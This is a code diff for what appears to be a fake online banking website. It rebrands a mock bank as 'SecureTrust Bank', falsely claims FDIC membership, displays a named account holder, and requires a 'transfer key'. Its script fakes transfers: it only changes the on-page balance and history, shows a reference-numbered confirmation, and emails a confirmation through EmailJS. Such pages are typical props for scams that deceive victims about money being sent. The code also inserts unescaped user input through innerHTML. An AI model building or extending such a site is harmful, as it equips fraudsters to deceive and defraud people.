-                    <p class="welcome-message">Manage your WestFargo Bank Debit Card</p>
+                    <p class="welcome-message">Manage your SecureTrust Bank Debit Card</p>
                 </div>
                 
                 <div class="debit-card-section">
@@ -823,15 +1089,17 @@
                             <div class="card" id="debit-card">
                                 <div class="card-front">
                                     <div class="card-logo">
-                                        <div class="logo-icon">$</div>
-                                        <div>WestFargo Bank</div>
+                                        <div class="logo-icon"><i class="fas fa-shield-alt"></i></div>
+                                        <div>Platinum Elite</div>
                                     </div>
-                                    <div class="card-chip"></div>
+                                    <div class="card-chip">
+                                        STB
+                                    </div>
                                     <div class="card-number">•••• •••• •••• 4582</div>
                                     <div class="card-details">
                                         <div class="card-holder">
                                             <div class="card-label">Card Holder</div>
-                                            <div>BEATRICE HORAN</div>
+                                            <div>SUSAN M PRICE</div>
                                         </div>
                                         <div class="card-expiry">
                                             <div class="card-label">Expires</div>
@@ -845,8 +1113,8 @@
                                         <div class="card-label">CVV</div>
                                         <div class="cvv-box">•••</div>
                                     </div>
-                                    <div class="card-logo" style="justify-content: center; margin-top: 20px;">
-                                        <div>WestFargo Bank</div>
+                                    <div class="card-logo" style="justify-content: center; margin-top: 24px;">
+                                        <div>SecureTrust Bank</div>
                                     </div>
                                 </div>
                             </div>
@@ -863,6 +1131,10 @@
                             <span>•••• •••• •••• 4582</span>
                         </div>
                         <div class="info-item">
+                            <span>Card Holder</span>
+                            <span>Susan M Price</span>
+                        </div>
+                        <div class="info-item">
                             <span>Expiration Date</span>
                             <span>08/2030</span>
                         </div>
@@ -872,19 +1144,19 @@
                         </div>
                         <div class="info-item">
                             <span>Card Status</span>
-                            <span style="color: var(--success-green);">Active</span>
+                            <span class="status-badge status-active">Active</span>
                         </div>
                         <div class="info-item">
                             <span>Daily Purchase Limit</span>
-                            <span>$5,000.00</span>
+                            <span>$25,000.00</span>
                         </div>
                         <div class="info-item">
                             <span>Daily ATM Limit</span>
-                            <span>$1,000.00</span>
+                            <span>$5,000.00</span>
                         </div>
                         
-                        <div style="margin-top: 25px;">
-                            <button class="btn" style="margin-bottom: 10px;">Report Card Lost/Stolen</button>
+                        <div style="margin-top: 32px;">
+                            <button class="btn" style="margin-bottom: 12px;">Report Card Lost/Stolen</button>
                             <button class="btn btn-secondary">Manage Card Limits</button>
                         </div>
                     </div>
@@ -901,13 +1173,17 @@
                 <button class="close-modal">&times;</button>
             </div>
             <div class="modal-body">
-                <p>Your transfer has been successfully initiated.</p>
-                <div class="security-note" style="margin: 20px 0;">
+                <p id="email-status">Sending transaction confirmation email...</p>
+                <div class="security-note" style="margin: 24px 0;">
                     <p><strong>Transfer Details:</strong></p>
+                    <p>Sender: <span id="confirm-sender">Susan M Price</span></p>
+                    <p>Receiver: <span id="confirm-receiver">Receiver Name</span></p>
                     <p>Amount: <span id="confirm-amount">$0.00</span></p>
-                    <p>To: <span id="confirm-bank">Bank Name</span></p>
+                    <p>To Bank: <span id="confirm-bank">Bank Name</span></p>
                     <p>Account: <span id="confirm-account">••••••••</span></p>
-                    <p>Estimated Delivery: <span id="confirm-date">MM/DD/YYYY</span></p>
+                    <p>Transfer Date: <span id="confirm-date">MM/DD/YYYY</span></p>
+                    <p>Description: <span id="confirm-description">No description</span></p>
+                    <p>Reference Number: <span id="confirm-reference">STB-2025-</span></p>
                 </div>
                 <p>A confirmation email has been sent to your registered email address.</p>
             </div>
@@ -921,7 +1197,7 @@
         <div class="container">
             <div class="footer-content">
                 <div class="footer-section">
-                    <h3>WestFargo Bank</h3>
+                    <h3>SecureTrust Bank</h3>
                     <ul>
                         <li><a href="#">About Us</a></li>
                         <li><a href="#">Careers</a></li>
@@ -949,8 +1225,8 @@
                 </div>
             </div>
             <div class="footer-bottom">
-                <p>© 2025 WestFargo Bank. Member FDIC. All rights reserved.</p>
-                <p>WestFargo Bank, N.A. is a registered service mark of WestFargo Bank Corporation.</p>
+                <p>© 2026 SecureTrust Bank. Member FDIC. All rights reserved.</p>
+                <p>SecureTrust Bank, N.A. is a registered service mark of SecureTrust Bank Corporation.</p>
             </div>
         </div>
     </footer>
@@ -962,6 +1238,7 @@
             const navLinks = document.querySelectorAll('.nav-link');
             const pages = document.querySelectorAll('.page');
             const actionCards = document.querySelectorAll('.action-card');
+            const transactionList = document.getElementById('transaction-list');
             
             function showPage(pageId) {
                 pages.forEach(page => {
@@ -1000,34 +1277,174 @@
                 showPage('login-page');
             });
             
+            // Auto-fill sender name based on selected account
+            document.getElementById('sender-account').addEventListener('change', function() {
+                const senderNameField = document.getElementById('sender-name');
+                const selectedOption = this.options[this.selectedIndex].text;
+                
+                if (selectedOption.includes('Susan M Price')) {
+                    senderNameField.value = 'Susan M Price';
+                } else if (selectedOption.includes('Price Family Trust')) {
+                    senderNameField.value = 'Price Family Trust';
+                } else {
+                    senderNameField.value = '';
+                }
+            });
+            
             // Transfer Form
             const transferForm = document.getElementById('transfer-form');
             const transferModal = document.getElementById('transfer-modal');
             const closeModal = document.querySelector('.close-modal');
             const confirmOk = document.getElementById('confirm-ok');
             
-            transferForm.addEventListener('submit', function(e) {
+            // Special transfer key validation - must be 8 characters with letters and numbers
+            function isValidTransferKey(key) {
+                // Must be exactly 8 characters
+                if (key.length !== 8) return false;
+                
+                // Must contain both letters and numbers
+                const hasLetter = /[a-zA-Z]/.test(key);
+                const hasNumber = /[0-9]/.test(key);
+                
+                return hasLetter && hasNumber;
+            }
+            
+            // Function to add transaction to history
+            function addTransactionToHistory(description, amount, isNegative = true, date = null) {
+                const transactionList = document.getElementById('transaction-list');
+                const dateObj = date ? new Date(date) : new Date();
+                const formattedDate = dateObj.toLocaleDateString('en-US', { 
+                    month: 'long', 
+                    day: 'numeric', 
+                    year: 'numeric' 
+                });
+                
+                const newTransaction = document.createElement('li');
+                newTransaction.className = 'transaction-item';
+                newTransaction.innerHTML = `
+                    <div class="transaction-details">
+                        <h4>${description}</h4>
+                        <div class="transaction-date">${formattedDate}</div>
+                    </div>
+                    <div class="transaction-amount ${isNegative ? 'negative' : 'positive'}">
+                        ${isNegative ? '-' : '+'}$${amount.toFixed(2)}
+                    </div>
+                `;
+                
+                // Insert at the top of the list
+                transactionList.insertBefore(newTransaction, transactionList.firstChild);
+                
+                // Update balance
+                const balanceAmount = document.querySelector('.balance-amount');
+                const currentBalance = parseFloat(balanceAmount.textContent.replace(/[$,]/g, ''));
+                const newBalance = currentBalance - amount;
+                balanceAmount.textContent = `$${newBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+                
+                return newBalance;
+            }
+            
+            // Function to send email using EmailJS
+            function sendTransactionEmail(transferDetails) {
+                // Using your service_dcsce43 service ID and template_8ibstil template ID
+                const serviceID = 'service_dcsce43';
+                const templateID = 'template_8ibstil';
+                
+                const templateParams = {
+                    sender_name: transferDetails.senderName,
+                    receiver_name: transferDetails.receiverName,
+                    amount: transferDetails.amount,
+                    to_bank: transferDetails.toBank,
+                    to_account: transferDetails.toAccount,
+                    transfer_date: transferDetails.transferDate,
+                    description: transferDetails.description,
+                    reference_number: transferDetails.referenceNumber,
+                    new_balance: transferDetails.newBalance
+                };
+                
+                // Send email using EmailJS 
+                return emailjs.send(serviceID, templateID, templateParams)
+                    .then(function(response) {
+                        console.log('Email sent successfully!', response.status, response.text);
+                        return true;
+                    }, function(error) {
+                        console.log('Email failed to send:', error);
+                        return false;
+                    });
+            }
+            
+            transferForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 
-                // Check transfer key (for demo, any 6-digit number works)
+                // Check transfer key (special 8-character code with letters and numbers)
                 const transferKey = document.getElementById('transfer-key').value;
-                if (transferKey.length !== 6 || isNaN(transferKey)) {
-                    alert('Please enter a valid 6-digit transfer key.');
+                if (!isValidTransferKey(transferKey)) {
+                    alert('Please enter a valid 8-character SecureTrust Bank transfer key containing both letters and numbers.');
                     return;
                 }
                 
+                // Get transfer details
+                const amount = parseFloat(document.getElementById('amount').value);
+                const senderName = document.getElementById('sender-name').value;
+                const receiverName = document.getElementById('receiver-name').value;
+                const toBank = document.getElementById('to-bank').value;
+                const toAccount = document.getElementById('to-account').value;
+                const transferDate = document.getElementById('date').value;
+                const description = document.getElementById('transfer-description').value || 'No description provided';
+                
+                // Generate reference number
+                const referenceNumber = 'STB-2025-' + Date.now().toString().slice(-6);
+                
+                // Add transaction to history immediately
+                const transactionDescription = `Transfer to ${receiverName} - ${toBank} (••••${toAccount.slice(-4)})`;
+                const newBalance = addTransactionToHistory(transactionDescription, amount, true, transferDate);
+                
+                // Prepare transfer details for email
+                const transferDetails = {
+                    senderName: senderName,
+                    receiverName: receiverName,
+                    amount: amount.toFixed(2),
+                    toBank: toBank,
+                    toAccount: '••••' + toAccount.slice(-4),
+                    transferDate: new Date(transferDate).toLocaleDateString('en-US', { 
+                        month: 'long', 
+                        day: 'numeric', 
+                        year: 'numeric' 
+                    }),
+                    description: description,
+                    referenceNumber: referenceNumber,
+                    newBalance: newBalance.toFixed(2)
+                };
+                
                 // Populate confirmation modal
-                document.getElementById('confirm-amount').textContent = '$' + 
-                    parseFloat(document.getElementById('amount').value).toFixed(2);
-                document.getElementById('confirm-bank').textContent = 
-                    document.getElementById('to-bank').value;
-                document.getElementById('confirm-account').textContent = 
-                    '••••' + document.getElementById('to-account').value.slice(-4);
+                document.getElementById('confirm-sender').textContent = senderName;
+                document.getElementById('confirm-receiver').textContent = receiverName;
+                document.getElementById('confirm-amount').textContent = '$' + amount.toFixed(2);
+                document.getElementById('confirm-bank').textContent = toBank;
+                document.getElementById('confirm-account').textContent = '••••' + toAccount.slice(-4);
                 document.getElementById('confirm-date').textContent = 
-                    document.getElementById('date').value;
+                    new Date(transferDate).toLocaleDateString('en-US', { 
+                        month: 'long', 
+                        day: 'numeric', 
+                        year: 'numeric' 
+                    });
+                document.getElementById('confirm-description').textContent = description;
+                document.getElementById('confirm-reference').textContent = referenceNumber;
                 
                 // Show modal
                 transferModal.classList.add('active');
+                
+                // Send email notification
+                try {
+                    const emailSent = await sendTransactionEmail(transferDetails);
+                    if (emailSent) {
+                        document.getElementById('email-status').textContent = 'Transaction confirmation email sent successfully!';
+                    } else {
+                        document.getElementById('email-status').textContent = 'Transaction completed, but email notification failed.';
+                    }
+                } catch (error) {
+                    console.error('Email sending failed:', error);
+                    document.getElementById('email-status').textContent = 'Transaction completed, but email notification failed.';
+                }
             });
             
             closeModal.addEventListener('click', function() {
@@ -1057,6 +1474,9 @@
             const today = new Date();
             const formattedDate = today.toISOString().split('T')[0];
             document.getElementById('date').value = formattedDate;
+            
+            // Auto-fill current user as sender
+            document.getElementById('sender-name').value = 'Susan M Price';
         });
     </script>
 </body>
